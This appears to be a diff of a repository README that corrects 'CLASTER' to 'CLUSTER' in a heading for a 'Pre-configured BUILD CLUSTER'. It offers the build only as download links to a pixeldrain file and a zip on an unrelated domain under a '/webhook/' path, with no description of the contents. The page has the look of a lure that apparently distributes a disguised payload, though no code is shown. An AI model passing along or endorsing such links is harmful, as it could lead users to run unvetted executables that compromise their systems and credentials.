@@ -1,5 +1,5 @@
 
-# Pre-configured BUILD CLASTER
+# Pre-configured BUILD CLUSTER
    Download  
 [pixeldrain](https://pixeldrain.com/u/XMVnrDvw) | [StaticMirror](https://junger.zzux.com/webhook/MOE_DLC/moe_cluster-ready.zip)
 ## ======= START =======
